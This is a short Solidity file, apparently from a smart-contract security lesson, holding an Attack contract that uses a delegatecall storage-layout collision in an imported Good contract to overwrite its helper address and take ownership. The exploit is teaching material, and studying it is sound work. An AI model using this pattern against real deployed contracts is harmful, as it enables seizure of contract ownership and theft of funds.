// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./Good.sol";

contract Attack{
    address public helper;
    address public owner;
    uint public num;

    Good public good;

    constructor(Good _good){
        good = Good(_good);
    }

    function setNum(uint256 _num)public{
        owner = msg.sender;
    }

    function attack() public{
        good.setNum(uint256(uint160(address(this))));
        good.setNum(1);
    }
}